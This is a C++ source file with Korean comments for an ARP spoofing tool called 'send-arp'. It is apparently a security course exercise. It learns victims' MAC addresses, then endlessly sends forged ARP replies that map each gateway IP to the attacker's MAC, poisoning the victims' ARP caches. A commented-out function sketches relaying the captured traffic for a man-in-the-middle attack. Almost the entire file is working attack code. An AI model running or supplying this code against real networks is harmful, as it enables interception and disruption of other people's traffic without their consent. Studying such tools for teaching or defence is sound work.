#include "pch.h"     // POSIX 표준 함수 제공
#include "ethhdr.h"     // Ethernet 헤더 구조체 정의
#include "arphdr.h"     // ARP 헤더 구조체 정의

#pragma pack(push, 1)  // 메모리 정렬방식 조정(패딩 제어) ,1 은 패딩없이 1바이트씩 정렬 네트워크 패킷 송수신시 패딩없이 직렬화로 송수신하기 위함
// Ethernet과 ARP 패킷을 합친 구조체 정의
struct EthArpPacket final {
    EthHdr eth_; // Ethernet 헤더
    ArpHdr arp_; // ARP 헤더
};
#pragma pack(pop) // 제어부 해제

struct ifreq interface_req;           // 네트워크 인터페이스 정보를 저장하기 위한 구조체
uint8_t* attacker_mac;      // 공격자의 MAC 주소를 저장할 포인터
char* attacker_ip;          // 공격자의 IP 주소를 저장할 포인터

struct ArpPair {
    uint32_t sender_ip;
    uint32_t target_ip;
    uint8_t sender_mac[Mac::SIZE];
};

// 프로그램 사용법 출력 함수
void usage() { 
    printf("syntax: send-arp <interface> <sender ip1> <target ip1> [<sender ip2> <target ip2> ...]\n");
    printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1 192.168.0.3 192.168.0.1\n");
}

// 공격자의 MAC 주소를 가져오는 함수
void getAttackerMac(char* dev) { 
    int sock_d = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
    interface_req.ifr_addr.sa_family = AF_INET;           // IPv4 주소 체계 설정
    strncpy(interface_req.ifr_name, dev, IFNAMSIZ - 1);   // 인터페이스 이름 설정
    ioctl(sock_d, SIOCGIFHWADDR, &interface_req);         // MAC 주소 가져오기
    attacker_mac = (uint8_t *)interface_req.ifr_hwaddr.sa_data; // MAC 주소 저장
}

// 공격자의 IP 주소를 가져오는 함수
void getAttackerIP(char* dev) {
    int sock_d = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
    strncpy(interface_req.ifr_name, dev, IFNAMSIZ - 1);    // 인터페이스 이름 설정
    ioctl(sock_d, SIOCGIFADDR, &interface_req);           // IP 주소 가져오기
    attacker_ip = inet_ntoa(((struct sockaddr_in*)&interface_req.ifr_addr)->sin_addr); // IP 주소 문자열로 변환
}

// ARP 요청 패킷을 생성 및 전송하는 함수
void sendArpRequest(char* dev, pcap_t* handle, uint32_t sender_ip) {
    EthArpPacket packet;  // Ethernet + ARP 패킷 구조체 생성
    
    // Ethernet 헤더 설정
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 브로드캐스트 MAC 주소
    packet.eth_.smac_ = Mac(attacker_mac);        // 공격자의 MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);       // Ethernet 타입: ARP

    // ARP 헤더 설정
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);      // 하드웨어 타입: Ethernet
    packet.arp_.pro_ = htons(EthHdr::Ip4);        // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::SIZE;                // 하드웨어 주소 길이
    packet.arp_.pln_ = Ip::SIZE;                 // 프로토콜 주소 길이
    packet.arp_.op_ = htons(ArpHdr::Request);    // ARP 요청
    packet.arp_.smac_ = Mac(attacker_mac);       // 요청자 MAC 주소
    packet.arp_.sip_ = htonl(Ip(attacker_ip));   // 요청자 IP 주소
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");// 타겟 MAC 주소 (알 수 없음)
    packet.arp_.tip_ = Ip(sender_ip);            // 타겟 IP 주소

    // ARP 요청 패킷 전송
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
//ARP 감염 패킷 전송
void sendArpInfectingReply(char* dev, pcap_t* handle, uint32_t victim_ip, 
                          const uint8_t* victim_mac, uint32_t gateway_ip) {
    EthArpPacket packet;
    
    packet.eth_.dmac_ = Mac(victim_mac);
    packet.eth_.smac_ = Mac(attacker_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(attacker_mac);
    packet.arp_.sip_ = Ip(gateway_ip);
    packet.arp_.tmac_ = Mac(victim_mac);
    packet.arp_.tip_ = Ip(victim_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}


/*
void relayPacket(pcap_t* handle, const u_char* received_packet, size_t packet_len,
                uint8_t* victim_mac, uint8_t* gateway_mac) {
    // 최소 패킷 크기 체크 (Ethernet 헤더 크기)
    if (packet_len < sizeof(EthHdr)) {
        fprintf(stderr, "Packet too small\n");
        return;
    }
    
    std::vector<u_char> relay_packet(received_packet, received_packet + packet_len);
    struct EthHdr* eth_header = (struct EthHdr*)relay_packet.data();
    
    // MAC 클래스 사용하여 안전하게 MAC 주소 설정
    if (memcmp(eth_header->dmac_, attacker_mac, Mac::SIZE) == 0) {
        // victim -> attacker -> gateway
        eth_header->dmac_ = Mac(gateway_mac);    // Mac 클래스의 할당 연산자 사용
        eth_header->smac_ = Mac(attacker_mac);
    } else {
        // gateway -> attacker -> victim
        eth_header->dmac_ = Mac(victim_mac);
        eth_header->smac_ = Mac(attacker_mac);
    }
    
    int result = pcap_sendpacket(handle, relay_packet.data(), packet_len);
    if (result != 0) {
        fprintf(stderr, "Failed to relay packet: %s\n", pcap_geterr(handle));
    }
}
*/

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    getAttackerMac(dev);
    getAttackerIP(dev);

    int pair_count = (argc - 2) / 2;
    std::vector<ArpPair> arp_pairs;
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // 모든 ARP 페어에 대한 MAC 주소 수집
    for(int i = 0; i < pair_count; i++) {
        ArpPair arp_pair;
        arp_pair.sender_ip = inet_addr(argv[2 + i * 2]);
        arp_pair.target_ip = inet_addr(argv[3 + i * 2]);

        sendArpRequest(dev, handle, arp_pair.sender_ip);

        while(true) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }

            EthArpPacket* recv_reply_packet = (struct EthArpPacket*)packet;
            if (recv_reply_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
            if (recv_reply_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
            if (recv_reply_packet->arp_.sip_ != Ip(arp_pair.sender_ip)) continue;

            const uint8_t* mac_bytes = reinterpret_cast<const uint8_t*>(&recv_reply_packet->eth_.smac_);
            memcpy(arp_pair.sender_mac, mac_bytes, Mac::SIZE);
            arp_pairs.push_back(arp_pair);
            break;
        }
    }

    // 모든 페어에 대해 주기적으로 ARP 감염 패킷 전송
    while(true) {
        for(const auto& arp_pair : arp_pairs) {
            sendArpInfectingReply(dev, handle, arp_pair.sender_ip, 
                                arp_pair.sender_mac, arp_pair.target_ip);
        }
        sleep(1);
    }

    pcap_close(handle);
    return 0;
}

